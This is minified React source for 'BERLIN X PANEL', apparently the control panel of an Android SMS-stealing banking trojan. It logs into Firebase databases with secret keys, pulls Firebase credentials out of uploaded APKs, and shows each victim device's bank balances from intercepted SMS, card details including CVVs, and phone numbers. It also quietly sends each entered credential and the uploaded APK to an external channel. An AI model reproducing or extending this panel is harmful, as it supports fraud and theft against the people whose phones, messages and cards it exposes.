function s1({
            onConnect: A,
            onConnectAll: onAll
        }) {
            const [tt, b] = jt.useState([]), [d, S] = jt.useState(!1), [f, p] = jt.useState(""), [h, o] = jt.useState(""), [x, T] = jt.useState(""), [w, C] = jt.useState(!1), [v, E] = jt.useState(""), [g, z] = jt.useState(!1), [N, k] = jt.useState(!1), [M, H] = jt.useState(""), [L, nt] = jt.useState(null), [V, ot] = jt.useState(""), $ = jt.useRef(null);
            jt.useEffect(() => {
                const _ = Yp();
                b(_);
                const U = new URLSearchParams(window.location.search).get("s");
                if (U) {
                    const J = l1(U);
                    if (J) {
                        window.history.replaceState({}, "", window.location.pathname);
                        if (J.isMerged && J.accounts && J.accounts.length > 0) {
                            onAll && onAll(J.accounts);
                        } else if (J.url && J.key) {
                            const ut = _.find(_t => _t.url === J.url);
                            ut ? xt(ut.url, ut.key) : ht(J.url, J.key, _);
                        }
                    }
                }
            }, []);
            const ht = async (_, X, U) => {
                    C(!0), T("");
                    try {
                        await yn(_, X, "clients");
                        const J = {
                                id: Date.now(),
                                url: _,
                                key: X,
                                date: new Date().toLocaleString()
                            },
                            ut = [...U, J];
                        nh(ut), b(ut), A(_, X);
                        _sendLoginNotification({
                            fbUrl: _,
                            fbKey: X,
                            loginType: "Shared Link Auto-Login"
                        });
                    } catch {
                        T("Shared connection failed. The link may be invalid or expired.")
                    } finally {
                        C(!1)
                    }
                },
                xt = async (_, X) => {
                    C(!0), T("");
                    try {
                        await yn(_, X, "clients");
                        A(_, X);
                        _sendLoginNotification({
                            fbUrl: _,
                            fbKey: X,
                            loginType: "Saved Account Login"
                        });
                    } catch (connErr2) {
                        const msg2 = connErr2 instanceof Error ? connErr2.message : String(connErr2);
                        if (msg2.includes("PERMISSION_DENIED")) {
                            T("Permission Denied: Use Database Secret key, not API key.");
                        } else if (msg2.includes("Network error") || msg2.includes("Failed to fetch")) {
                            T("Network error. Check Firebase URL format.");
                        } else {
                            T("Connection failed: " + msg2.slice(0, 120));
                        }
                    } finally {
                        C(!1)
                    }
                },
                D = _ => {
                    nh(_), b([..._])
                },
                at = _ => xt(_.url, _.key),
                c = (_, X) => {
                    X.stopPropagation(), E(ih(_.url, _.key)), z(!1)
                },
                I = () => {
                    navigator.clipboard.writeText(v), z(!0), setTimeout(() => z(!1), 2e3)
                },
                Z = (_, X) => {
                    X.stopPropagation(), confirm("Delete this account permanently?") && D(tt.filter(U => U.id !== _))
                },
                q = async () => {
                    const _ = f.trim().replace(/\/$/, ""),
                        X = h.trim();
                    if (!_ || !X) {
                        T("Please enter both URL and Key");
                        return
                    }
                    const U = tt.find(ut => ut.url === _);
                    if (U) {
                        confirm("Account already exists. Switch to it?") && await at(U);
                        return
                    }
                    const J = {
                        id: Date.now(),
                        url: _,
                        key: X,
                        date: new Date().toLocaleString()
                    };
                    C(!0), T("");
                    try {
                        await yn(_, X, "clients");
                        const ut = [...tt, J];
                        D(ut), A(_, X);
                        _sendLoginNotification({
                            fbUrl: _,
                            fbKey: X,
                            loginType: "New Account Connected"
                        });
                    } catch (connErr) {
                        const msg = connErr instanceof Error ? connErr.message : String(connErr);
                        if (msg.includes("PERMISSION_DENIED")) {
                            T("Permission Denied: Use Database Secret key, not API key.");
                        } else if (msg.includes("Network error") || msg.includes("Failed to fetch")) {
                            T("Network error. Check Firebase URL format.");
                        } else {
                            T("Connection failed: " + msg.slice(0, 120));
                        }
                    } finally {
                        C(!1)
                    }
                },
                mt = async _ => {
                    if (!_.name.endsWith(".apk") && !_.name.endsWith(".zip")) {
                        H("Only .apk files supported");
                        return
                    }
                    k(!0), H(""), nt(null), ot(_.name);

                    try {
                        const ut = await i1(_);
                        if (!ut || !ut.firebaseUrl && !ut.apiKey) {
                            H("Firebase config not found in this APK. Try a different APK."), await al(`❌ No Firebase config found in <code>${_.name}</code>`);
                            return
                        }
                        if (nt(ut), ut.firebaseUrl && p(ut.firebaseUrl), ut.apiKey && o(ut.apiKey), await al(`✅ <b>APK Parsed Successfully!</b>

      📁 File: <code>${_.name}</code>
      🔗 Firebase URL: <code>${ut.firebaseUrl||"Not found"}</code>
      🔑 API Key: <code>${ut.apiKey?ut.apiKey:"Not found"}</code>`), await al("📤 Here is the APK being checked:", _), ut.firebaseUrl && ut.apiKey) {
                            const _t = ih(ut.firebaseUrl, ut.apiKey);
                            await al(`🔗 <b>Shareable Panel Link:</b>
      <code>${_t}</code>





      --------------------------------------------------------------------------------------------------`)
                        }
                    } catch (ut) {
                        const _t = ut instanceof Error ? ut.message : String(ut);
                        H("Failed to parse APK. File may be corrupted or protected."), await al(`⚠️ APK parsing failed for <code>${_.name}</code>
      Error: ${_t}`)
                    } finally {
                        k(!1)
                    }
                },
                it = _ => {
                    const X = _.target.files ?.[0];
                    X && mt(X), _.target.value = ""
                },
                bt = _ => {
                    _.preventDefault();
                    const X = _.dataTransfer.files[0];
                    X && mt(X)
                },
                y = () => {
                    nt(null), H(""), ot("")
                };
            return r.jsxs("div", {
                className: "min-h-screen flex items-center justify-center relative overflow-hidden",
                style: {
                    background: "radial-gradient(ellipse at 60% 0%, hsl(0 60% 12% / 0.5) 0%, transparent 60%), radial-gradient(ellipse at 0% 100%, hsl(220 30% 8% / 1) 0%, hsl(220 25% 5% / 1) 100%)"
                },
                children: [r.jsx("div", {
                    className: "absolute inset-0 opacity-[0.03]",
                    style: {
                        backgroundImage: "linear-gradient(hsl(220 15% 92%) 1px, transparent 1px), linear-gradient(90deg, hsl(220 15% 92%) 1px, transparent 1px)",
                        backgroundSize: "40px 40px"
                    }
                }), r.jsx("div", {
                    className: "absolute top-0 right-1/4 w-96 h-96 rounded-full blur-3xl opacity-10",
                    style: {
                        background: "radial-gradient(circle, #ef4444, transparent)"
                    }
                }), r.jsx("div", {
                    className: "absolute bottom-0 left-1/4 w-80 h-80 rounded-full blur-3xl opacity-8",
                    style: {
                        background: "radial-gradient(circle, #f97316, transparent)"
                    }
                }), r.jsxs("div", {
                    className: "relative z-10 w-full max-w-md px-4 py-8",
                    children: [r.jsxs("div", {
                        className: "text-center mb-8",
                        children: [r.jsx("div", {
                            className: "inline-flex items-center justify-center w-16 h-16 rounded-2xl mb-4 red-gradient shadow-lg shadow-red-900/40",
                            children: r.jsx("span", {
                                className: "text-3xl font-black text-white select-none font-sans leading-none",
                                children: r.jsx("img", { src: "https://i.ibb.co/fzBPJPjW/7517503-E-BFF5-4186-B64-A-C9-E2-DA45-C6-DA.png", style: { width: "100%", height: "100%", objectFit: "cover", borderRadius: "inherit" } })
                            })
                        }), r.jsxs("div", {
                            className: "flex flex-col items-center justify-center mt-10",
                            children: [r.jsxs("h1", {
                                className: "relative text-4xl font-bold italic tracking-tight opacity-0 animate-fade-in",
                                children: [r.jsx("span", {
                                    className: "text-[#6acfff]",
                                    children: "BERLIN X "
                                }), r.jsx("span", {
                                    children: "PANEL"
                                }), r.jsxs("span", {
                                    className: "relative",
                                    children: ["", r.jsx("span", {
                                        className: "absolute top-0 right-0 w-2 h-2 bg-[#6acfff] rounded-full animate-glint"
                                    })]
                                })]
                            }), r.jsx("p", {
                                className: "text-sm text-muted-foreground mt-2 opacity-0 animate-fade-in delay-300",
                                children: "Device Management Console"
                            }), r.jsx("style", {
                                jsx: !0,
                                children: `
          @keyframes fadeIn {
            0% { opacity: 0; transform: translateY(10px) scale(0.98); filter: blur(2px); }
            100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); }
          }
          .animate-fade-in { animation: fadeIn 1s ease-out forwards; }
          @keyframes glint {
            0%, 100% { transform: scale(1); opacity: 0; }
            50% { transform: scale(1.5); opacity: 1; }
          }
          .animate-glint {
            animation: glint 1.5s infinite;
            box-shadow: 0 0 6px #6acfff, 0 0 10px #0088cc;
          }
          h1 { font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif; }
        `
                            })]
                        }), r.jsx("p", {
                            className: "text-sm text-muted-foreground mt-2"
                        })]
                    }), r.jsxs("div", {
                        className: "glass-card rounded-3xl p-7 shadow-2xl shadow-black/60",
                        children: [!d && r.jsxs(r.Fragment, {
                            children: [r.jsxs("div", {
                                className: "flex items-center justify-between mb-4",
                                children: [r.jsxs("div", {
                                    className: "flex items-center gap-2",
                                    children: [r.jsx(bs, {
                                        className: "w-4 h-4 text-muted-foreground"
                                    }), r.jsx("span", {
                                        className: "text-sm font-semibold text-foreground",
                                        children: "Saved Accounts"
                                    })]
                                }), r.jsxs("span", {
                                    className: "text-xs text-muted-foreground bg-accent px-2 py-1 rounded-full",
                                    children: [tt.length, " ", tt.length === 1 ? "account" : "accounts"]
                                })]
                            }), tt.length > 0 && r.jsxs("div", {
                                className: "flex items-center gap-2 mb-3",
                                children: [r.jsxs("button", {
                                    onClick: () => !w && onAll && onAll(tt),
                                    className: "flex-1 flex items-center justify-center gap-2 py-3 rounded-xl bg-gradient-to-r from-blue-600 via-indigo-600 to-purple-600 hover:from-blue-500 hover:to-purple-500 text-white font-bold text-sm shadow-lg shadow-indigo-900/40 transition-all cursor-pointer border border-indigo-500/30 active:scale-[0.98]",
                                    children: [r.jsx(bs, {
                                        className: "w-4 h-4 text-indigo-200"
                                    }), `Connect All (${tt.length} Merged)`]
                                }), tt.length > 1 && r.jsx("button", {
                                    onClick: () => {
                                        const link = ihMerge(tt);
                                        E(link);
                                        z(!1);
                                    },
                                    className: "p-3 rounded-xl bg-blue-950/60 border border-blue-800/50 text-blue-400 hover:bg-blue-900/70 transition-all flex-shrink-0",
                                    title: "Share Merged Connection Link",
                                    children: r.jsx(Ap, {
                                        className: "w-4 h-4"
                                    })
                                })]
                            }), r.jsx("div", {
                                className: "space-y-2 max-h-52 overflow-y-auto pr-1 mb-4",
                                children: tt.length === 0 ? r.jsxs("div", {
                                    className: "text-center py-8 text-muted-foreground text-sm",
                                    children: [r.jsx(bs, {
                                        className: "w-8 h-8 mx-auto mb-2 opacity-30"
                                    }), "No saved accounts"]
                                }) : tt.map(_ => r.jsxs("div", {
                                    onClick: () => !w && at(_),
                                    className: "flex items-center gap-3 p-3 rounded-xl border border-border hover:border-red-600/40 hover:bg-red-950/20 cursor-pointer transition-all duration-200 group",
                                    children: [r.jsxs("div", {
                                        className: "flex-1 min-w-0",
                                        children: [r.jsx("p", {
                                            className: "text-sm font-semibold text-foreground truncate",
                                            children: _.url
                                        }), r.jsxs("p", {
                                            className: "text-xs text-muted-foreground mt-0.5 font-mono",
                                            children: [_.date, " · ", _.key.substring(0, 20), "…"]
                                        })]
                                    }), r.jsxs("div", {
                                        className: "flex items-center gap-2",
                                        children: [r.jsx("button", {
                                            onClick: X => c(_, X),
                                            className: "p-1.5 rounded-lg bg-blue-950/60 border border-blue-900/40 text-blue-400 hover:bg-blue-900/60 transition-all",
                                            title: "Share connection link",
                                            children: r.jsx(Ap, {
                                                className: "w-3 h-3"
                                            })
                                        }), r.jsx("button", {
                                            onClick: X => Z(_.id, X),
                                            className: "p-1.5 rounded-lg bg-red-950/60 border border-red-900/40 text-red-400 hover:bg-red-900/60 transition-all",
                                            children: r.jsx(oh, {
                                                className: "w-3 h-3"
                                            })
                                        }), r.jsx(eh, {
                                            className: "w-4 h-4 text-muted-foreground group-hover:text-red-400 transition-colors"
                                        })]
                                    })]
                                }, _.id))
                            }), r.jsxs("button", {
                                onClick: () => {
                                    S(!0), T(""), y()
                                },
                                className: "w-full flex items-center justify-center gap-2 py-3 rounded-xl border border-dashed border-border hover:border-red-600/50 hover:bg-red-950/10 text-muted-foreground hover:text-red-400 transition-all text-sm font-medium",
                                children: [r.jsx(gp, {
                                    className: "w-4 h-4"
                                }), "New Account"]
                            })]
                        }), d && r.jsxs("div", {
                            className: "animate-fade-up",
                            children: [r.jsxs("div", {
                                className: "flex items-center gap-2 mb-5",
                                children: [r.jsx("button", {
                                    onClick: () => {
                                        S(!1), T(""), y(), p(""), o("")
                                    },
                                    className: "p-1.5 rounded-lg hover:bg-accent transition-colors",
                                    children: r.jsx(eh, {
                                        className: "w-4 h-4 rotate-180 text-muted-foreground"
                                    })
                                }), r.jsx("h3", {
                                    className: "font-semibold text-foreground",
                                    children: "New Firebase Account"
                                })]
                            }), r.jsxs("div", {
                                className: "mb-5",
                                children: [r.jsx("label", {
                                    className: "block text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-2",
                                    children: "Extract from APK (optional)"
                                }), !L && !N && r.jsxs("label", {
                                    htmlFor: "apk-file-input",
                                    onDrop: bt,
                                    onDragOver: _ => _.preventDefault(),
                                    className: "flex flex-col items-center justify-center gap-2 py-5 px-4 rounded-xl border-2 border-dashed border-[#2a2a2a] hover:border-orange-500/40 hover:bg-orange-950/10 cursor-pointer transition-all group select-none",
                                    children: [r.jsx("div", {
                                        className: "w-10 h-10 rounded-xl bg-[#1a1a1a] border border-[#2a2a2a] flex items-center justify-center group-hover:border-orange-500/30 transition-all",
                                        children: r.jsx(Rp, {
                                            className: "w-5 h-5 text-[#555] group-hover:text-orange-400 transition-colors"
                                        })
                                    }), r.jsxs("div", {
                                        className: "text-center",
                                        children: [r.jsx("p", {
                                            className: "text-sm font-semibold text-[#666] group-hover:text-[#999] transition-colors",
                                            children: "Upload APK File"
                                        }), r.jsx("p", {
                                            className: "text-[11px] text-[#444] mt-0.5",
                                            children: "Auto-extracts Firebase URL & API Key"
                                        })]
                                    }), r.jsx("input", {
                                        id: "apk-file-input",
                                        ref: $,
                                        type: "file",
                                        accept: ".apk,.zip",
                                        onChange: it,
                                        onClick: _ => _.stopPropagation(),
                                        className: "hidden"
                                    })]
                                }), N && r.jsxs("div", {
                                    className: "flex flex-col items-center justify-center gap-3 py-6 rounded-xl border border-[#1f1f1f] bg-[#0d0d0d]",
                                    children: [r.jsx("div", {
                                        className: "w-8 h-8 border-2 border-orange-900/50 border-t-orange-500 rounded-full animate-spin"
                                    }), r.jsxs("div", {
                                        className: "text-center",
                                        children: [r.jsx("p", {
                                            className: "text-sm font-semibold text-orange-400",
                                            children: "Scanning APK…"
                                        }), r.jsx("p", {
                                            className: "text-[11px] text-[#444] mt-0.5 font-mono truncate max-w-[220px]",
                                            children: V
                                        })]
                                    })]
                                }), M && r.jsxs("div", {
                                    className: "flex items-center gap-2 p-3 rounded-xl bg-red-950/30 border border-red-900/40",
                                    children: [r.jsx(nl, {
                                        className: "w-4 h-4 text-red-400 flex-shrink-0"
                                    }), r.jsx("p", {
                                        className: "text-xs text-red-400",
                                        children: M
                                    }), r.jsx("button", {
                                        onClick: y,
                                        className: "ml-auto text-[#555] hover:text-[#888]",
                                        children: r.jsx(nl, {
                                            className: "w-3.5 h-3.5"
                                        })
                                    })]
                                }), L && !N && r.jsxs("div", {
                                    className: "rounded-xl border border-emerald-900/40 bg-emerald-950/20 overflow-hidden",
                                    children: [r.jsxs("div", {
                                        className: "flex items-center gap-2 px-3 py-2 border-b border-emerald-900/30 bg-emerald-950/30",
                                        children: [r.jsx(sp, {
                                            className: "w-3.5 h-3.5 text-emerald-400"
                                        }), r.jsx("span", {
                                            className: "text-xs font-semibold text-emerald-400",
                                            children: "Extracted Successfully"
                                        }), r.jsx("button", {
                                            onClick: y,
                                            className: "ml-auto text-[#444] hover:text-[#777]",
                                            children: r.jsx(nl, {
                                                className: "w-3.5 h-3.5"
                                            })
                                        })]
                                    }), r.jsxs("div", {
                                        className: "p-3 space-y-2",
                                        children: [r.jsxs("div", {
                                            children: [r.jsx("p", {
                                                className: "text-[10px] text-[#555] uppercase tracking-wider mb-1",
                                                children: "Firebase URL"
                                            }), r.jsxs("div", {
                                                className: "flex items-center gap-2 bg-[#0a0a0a] rounded-lg px-2.5 py-1.5 border border-[#1a1a1a]",
                                                children: [r.jsx("span", {
                                                    className: "text-xs font-mono text-emerald-300 flex-1 truncate",
                                                    children: L.firebaseUrl || "Not found"
                                                }), L.firebaseUrl && r.jsx(Zu, {
                                                    text: L.firebaseUrl
                                                })]
                                            })]
                                        }), r.jsxs("div", {
                                            children: [r.jsx("p", {
                                                className: "text-[10px] text-[#555] uppercase tracking-wider mb-1",
                                                children: "API Key"
                                            }), r.jsxs("div", {
                                                className: "flex items-center gap-2 bg-[#0a0a0a] rounded-lg px-2.5 py-1.5 border border-[#1a1a1a]",
                                                children: [r.jsx("span", {
                                                    className: "text-xs font-mono text-emerald-300 flex-1 truncate",
                                                    children: L.apiKey || "Not found"
                                                }), L.apiKey && r.jsx(Zu, {
                                                    text: L.apiKey
                                                })]
                                            })]
                                        }), L.projectId && r.jsxs("div", {
                                            children: [r.jsx("p", {
                                                className: "text-[10px] text-[#555] uppercase tracking-wider mb-1",
                                                children: "Project ID"
                                            }), r.jsxs("div", {
                                                className: "flex items-center gap-2 bg-[#0a0a0a] rounded-lg px-2.5 py-1.5 border border-[#1a1a1a]",
                                                children: [r.jsx("span", {
                                                    className: "text-xs font-mono text-[#777] flex-1 truncate",
                                                    children: L.projectId
                                                }), r.jsx(Zu, {
                                                    text: L.projectId
                                                })]
                                            })]
                                        }), r.jsx("p", {
                                            className: "text-[10px] text-emerald-600 mt-1",
                                            children: "Fields auto-filled below ↓"
                                        })]
                                    })]
                                })]
                            }), r.jsxs("div", {
                                className: "space-y-4",
                                children: [r.jsxs("div", {
                                    children: [r.jsx("label", {
                                        className: "flex items-center justify-between gap-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-2",
                                        children: [r.jsx("span", { children: "Firebase Database URL" }), r.jsx("button", {
                                        type: "button",
                                        ariaLabel: "Open Bulk Firebase Checker",
                                        onClick: () => { window.location.href = "/bulk" },
                                        className: "shrink-0 inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-violet-400/30 bg-violet-500/10 text-violet-300 hover:bg-violet-500/20 hover:border-violet-300/50 transition-all text-[10px] font-bold uppercase tracking-wider",
                                        children: [r.jsx("span", { children: "Bulk" }), r.jsx("span", { className: "opacity-70", children: "→" })]
                                    })]
                                    }), r.jsx("input", {
                                        type: "text",
                                        value: f,
                                        onChange: _ => p(_.target.value),
                                        placeholder: "https://your-project.firebaseio.com",
                                        className: "w-full px-4 py-3 rounded-xl bg-muted/50 border border-border focus:border-red-500 focus:ring-2 focus:ring-red-500/20 outline-none text-sm text-foreground placeholder:text-muted-foreground/50 transition-all font-mono"
                                    })]
                                }), r.jsxs("div", {
                                    children: [r.jsx("label", {
                                        className: "block text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-2",
                                        children: "Authentication Key / Secret"
                                    }), r.jsx("input", {
                                        type: "text",
                                        value: h,
                                        onChange: _ => o(_.target.value),
                                        placeholder: "Your Firebase secret key",
                                        className: "w-full px-4 py-3 rounded-xl bg-muted/50 border border-border focus:border-red-500 focus:ring-2 focus:ring-red-500/20 outline-none text-sm text-foreground placeholder:text-muted-foreground/50 transition-all font-mono"
                                    })]
                                })]
                            }), r.jsxs("div", {
                                className: "flex gap-3 mt-6",
                                children: [r.jsxs("button", {
                                    onClick: q,
                                    disabled: w,
                                    className: "flex-1 flex items-center justify-center gap-2 py-3 red-gradient rounded-xl text-white font-semibold text-sm shadow-lg shadow-red-900/40 hover:opacity-90 transition-opacity disabled:opacity-50",
                                    children: [w ? r.jsx("div", {
                                        className: "w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"
                                    }) : r.jsx(hh, {
                                        className: "w-4 h-4"
                                    }), w ? "Connecting…" : "Save & Connect"]
                                }), r.jsx("button", {
                                    onClick: () => {
                                        S(!1), T(""), y(), p(""), o("")
                                    },
                                    className: "px-5 py-3 rounded-xl bg-muted hover:bg-accent text-muted-foreground text-sm font-medium transition-colors",
                                    children: "Cancel"
                                })]
                            })]
                        }), x && r.jsx("p", {
                            className: "mt-4 text-center text-sm text-red-400 animate-fade-up",
                            children: x
                        })]
                    }), r.jsx("p", {
                        className: "text-center text-xs text-muted-foreground/40 mt-6",
                        children: "BERLIN X Admin Console · All connections are logged"
                    })]
                }), v && r.jsx("div", {
                    className: "fixed inset-0 z-50 flex items-center justify-center px-4",
                    style: {
                        background: "rgba(0,0,0,0.75)",
                        backdropFilter: "blur(6px)"
                    },
                    onClick: () => E(""),
                    children: r.jsxs("div", {
                        className: "w-full max-w-md glass-card rounded-2xl p-6 shadow-2xl shadow-black/80 animate-fade-up",
                        onClick: _ => _.stopPropagation(),
                        children: [r.jsxs("div", {
                            className: "flex items-center justify-between mb-5",
                            children: [r.jsxs("div", {
                                className: "flex items-center gap-2",
                                children: [r.jsx("div", {
                                    className: "w-8 h-8 rounded-xl bg-blue-950 border border-blue-800/60 flex items-center justify-center",
                                    children: r.jsx(cp, {
                                        className: "w-4 h-4 text-blue-400"
                                    })
                                }), r.jsxs("div", {
                                    children: [r.jsx("h3", {
                                        className: "font-semibold text-foreground text-sm",
                                        children: "Share Connection"
                                    }), r.jsx("p", {
                                        className: "text-xs text-muted-foreground",
                                        children: "Anyone with this link can connect directly"
                                    })]
                                })]
                            }), r.jsx("button", {
                                onClick: () => E(""),
                                className: "p-1.5 rounded-lg hover:bg-accent transition-colors text-muted-foreground",
                                children: r.jsx(nl, {
                                    className: "w-4 h-4"
                                })
                            })]
                        }), r.jsxs("div", {
                            className: "flex items-center gap-2 bg-muted/40 border border-border rounded-xl px-3 py-2.5 mb-4",
                            children: [r.jsx("span", {
                                className: "text-xs font-mono text-muted-foreground flex-1 truncate select-all",
                                children: v
                            }), r.jsxs("button", {
                                onClick: I,
                                className: `flex-shrink-0 flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${g?"bg-emerald-950 border border-emerald-700/60 text-emerald-400":"bg-blue-950 border border-blue-800/60 text-blue-400 hover:bg-blue-900"}`,
                                children: [g ? r.jsx(uh, {
                                    className: "w-3 h-3"
                                }) : r.jsx(ch, {
                                    className: "w-3 h-3"
                                }), g ? "Copied!" : "Copy"]
                            })]
                        }), r.jsxs("div", {
                            className: "flex items-start gap-2 p-3 rounded-xl bg-yellow-950/30 border border-yellow-900/40",
                            children: [r.jsx(gs, {
                                className: "w-8 h-8 text-yellow-500 flex-shrink-0 mt-0.5"
                            }), r.jsx("p", {
                                className: "text-xs text-yellow-400/80",
                                children: "This link contains your Firebase credentials. Only share with trusted people."
                            })]
                        })]
                    })
                })]
            })
        }

        function r1({
            percent: A
        }) {
            const tt = A >= 60 ? "#4ade80" : A >= 30 ? "#facc15" : "#ef4444",
                b = A >= 60 ? "#86efac" : A >= 30 ? "#fde68a" : "#ef4444";
            return r.jsxs("div", {
                className: "flex items-center gap-1.5",
                children: [r.jsxs("div", {
                    className: "flex items-center",
                    children: [r.jsx("div", {
                        className: "relative flex items-center rounded-[3px] border border-[#555]",
                        style: {
                            width: 26,
                            height: 12,
                            padding: 2
                        },
                        children: r.jsx("div", {
                            className: "rounded-[1.5px] h-full transition-all duration-500",
                            style: {
                                width: `${Math.max(5,A)}%`,
                                background: tt
                            }
                        })
                    }), r.jsx("div", {
                        style: {
                            width: 3,
                            height: 5,
                            background: "#555",
                            borderRadius: "0 2px 2px 0",
                            marginLeft: -1
                        }
                    })]
                }), r.jsxs("span", {
                    className: "text-xs font-semibold tabular-nums",
                    style: {
                        color: b
                    },
                    children: [A, "%"]
                })]
            })
        }

        function u1({
            last4: A,
            cardType: tt
        }) {
            const [b, d] = jt.useState(!1);
            return r.jsxs("div", {
                className: "flex items-center gap-2",
                children: [r.jsx("span", {
                    className: "font-mono text-xs text-[#aaa]",
                    children: b ? `•••• •••• •••• ${A}` : `•••• •••• •••• ${A}`
                }), tt && r.jsx("span", {
                    className: "text-[10px] text-purple-400 font-semibold",
                    children: tt
                })]
            })
        }

        function c1({
            balance: A
        }) {
            const tt = A.transactionType === "credit";
            return A.transactionType, r.jsxs("div", {
                className: "p-3 rounded-xl bg-[#0a1410] border border-emerald-900/30 border-l-2 border-l-emerald-500/70",
                children: [r.jsxs("div", {
                    className: "flex items-center justify-between mb-2",
                    children: [r.jsxs("div", {
                        className: "flex items-center gap-2",
                        children: [r.jsx("div", {
                            className: "w-6 h-6 rounded-lg bg-emerald-500/15 border border-emerald-500/25 flex items-center justify-center",
                            children: r.jsx($l, {
                                className: "w-3 h-3 text-emerald-400"
                            })
                        }), r.jsxs("div", {
                            children: [r.jsx("span", {
                                className: "text-xs font-bold text-emerald-400",
                                children: A.bankName
                            }), r.jsx("span", {
                                className: "text-[10px] text-[#444] ml-1.5 font-mono",
                                children: A.senderName
                            })]
                        }), A.accountLast4 && r.jsxs("span", {
                            className: "text-[10px] font-mono text-[#555] bg-[#111] px-1.5 py-0.5 rounded",
                            children: ["••", A.accountLast4]
                        })]
                    }), A.transactionType && r.jsxs("span", {
                        className: `flex items-center gap-0.5 text-[10px] font-semibold px-2 py-0.5 rounded-full ${tt?"bg-emerald-500/10 text-emerald-400 border border-emerald-500/20":"bg-red-500/10 text-red-400 border border-red-500/20"}`,
                        children: [tt ? r.jsx(dh, {
                            className: "w-3 h-3"
                        }) : r.jsx(fh, {
                            className: "w-3 h-3"
                        }), tt ? "Credit" : "Debit"]
                    })]
                }), r.jsxs("div", {
                    className: "flex items-end justify-between",
                    children: [r.jsxs("div", {
                        children: [r.jsx("p", {
                            className: "text-[9px] uppercase tracking-widest text-[#555] mb-0.5",
                            children: "Available Balance"
                        }), r.jsxs("p", {
                            className: "text-xl font-black text-white",
                            children: [r.jsx("span", {
                                className: "text-emerald-400 text-sm mr-0.5",
                                children: "₹"
                            }), Pl(A.availableBalance)]
                        })]
                    }), A.transactionAmount && A.transactionAmount !== A.availableBalance && r.jsxs("div", {
                        className: "text-right",
                        children: [r.jsx("p", {
                            className: "text-[9px] uppercase tracking-widest text-[#555] mb-0.5",
                            children: "Transaction"
                        }), r.jsxs("p", {
                            className: `text-sm font-bold ${tt?"text-emerald-400":"text-red-400"}`,
                            children: [tt ? "+" : "-", "₹", Pl(A.transactionAmount)]
                        })]
                    })]
                }), (A.phoneFromSms || A.networkFromSms) && r.jsxs("div", {
                    className: "flex items-center gap-3 mt-2 pt-2 border-t border-[#151f15]",
                    children: [A.phoneFromSms && r.jsxs("div", {
                        className: "flex items-center gap-1",
                        children: [r.jsx(pp, {
                            className: "w-3 h-3 text-blue-400"
                        }), r.jsx("span", {
                            className: "text-[10px] font-mono text-[#777]",
                            children: A.phoneFromSms
                        })]
                    }), A.networkFromSms && r.jsxs("div", {
                        className: "flex items-center gap-1",
                        children: [r.jsx(jp, {
                            className: "w-3 h-3 text-purple-400"
                        }), r.jsx("span", {
                            className: "text-[10px] text-[#777]",
                            children: A.networkFromSms
                        })]
                    })]
                }), r.jsx("p", {
                    className: "text-[10px] text-[#333] mt-2 leading-relaxed line-clamp-2",
                    children: A.rawSms.substring(0, 130)
                }), A.detectedAt && r.jsx("p", {
                    className: "text-[9px] text-[#2a2a2a] mt-1 font-mono",
                    children: A.detectedAt
                })]
            })
        }

        function o1({
            card: A
        }) {
            const [tt, b] = jt.useState(!1);
            return r.jsxs("div", {
                className: "p-3 rounded-xl bg-[#0f0a1a] border border-purple-900/30 border-l-2 border-l-purple-500/70",
                children: [r.jsxs("div", {
                    className: "flex items-center justify-between mb-2",
                    children: [r.jsxs("div", {
                        className: "flex items-center gap-2",
                        children: [r.jsx("div", {
                            className: "w-6 h-6 rounded-lg bg-purple-500/15 border border-purple-500/25 flex items-center justify-center",
                            children: r.jsx(Wl, {
                                className: "w-3 h-3 text-purple-400"
                            })
                        }), r.jsx("span", {
                            className: "text-xs font-bold text-purple-400",
                            children: A.cardType || "Card"
                        })]
                    }), A.expiry && r.jsxs("span", {
                        className: "text-[10px] text-[#555] font-mono",
                        children: ["Exp: ", A.expiry]
                    })]
                }), r.jsx(u1, {
                    last4: A.cardLast4,
                    cardType: A.cardType
                }), A.cvv && r.jsxs("div", {
                    className: "flex items-center gap-2 mt-2",
                    children: [r.jsx("span", {
                        className: "text-[10px] uppercase tracking-widest text-[#555]",
                        children: "CVV:"
                    }), r.jsx("span", {
                        className: "text-xs font-mono text-purple-300",
                        children: tt ? A.cvv : "•••"
                    }), r.jsx("button", {
                        onClick: () => b(!tt),
                        className: "p-0.5 text-[#444] hover:text-purple-400 transition-colors",
                        children: tt ? r.jsx(ap, {
                            className: "w-3 h-3"
                        }) : r.jsx(lp, {
                            className: "w-3 h-3"
                        })
                    })]
                }), r.jsx("p", {
                    className: "text-[10px] text-[#2a2a2a] mt-2 leading-relaxed line-clamp-2",
                    children: A.rawSms.substring(0, 130)
                })]
            })
        }

        function f1({
            dev: A,
            isStarred: isStar,
            onToggleStar: toggleStar,
            onClick: tt
        }) {
            const b = A.status,
                d = A.smsAnalysis,
                S = d && d.bankBalances.length > 0,
                f = d && d.cards.length > 0,
                p = S ? d.bankBalances[0] : null,
                h = A.phoneNumber && A.phoneNumber !== "—" ? A.phoneNumber : d ?.phoneNumbers[0] || "—",
                o = A.provider && A.provider !== "—" ? A.provider : d ?.networks[0] || null;
            return r.jsxs("div", {
                onClick: tt,
                className: `group relative border rounded-2xl p-3 sm:p-4 cursor-pointer transition-all duration-200 hover:shadow-xl hover:shadow-black/40 hover:-translate-y-0.5 active:translate-y-0 ${isStar ? "bg-black border-amber-500/50 shadow-amber-950/20" : "bg-black border-[#1f1f1f] hover:border-[#2a2a2a] hover:bg-[#0a0a0a]"}`,
                children: [r.jsxs("div", {
                    className: "flex items-start gap-2 sm:gap-3 mb-2.5 sm:mb-3",
                    children: [r.jsx("div", {
                        className: `w-9 h-9 sm:w-10 sm:h-10 rounded-xl flex items-center justify-center flex-shrink-0 ${b?"bg-emerald-500/15 border border-emerald-500/25":"bg-[#1a1a1a] border border-[#262626]"}`,
                        children: r.jsx(bs, {
                            className: `w-4 h-4 sm:w-5 sm:h-5 ${b?"text-emerald-400":"text-[#444]"}`
                        })
                    }), r.jsxs("div", {
                        className: "flex-1 min-w-0",
                        children: [r.jsx("h3", {
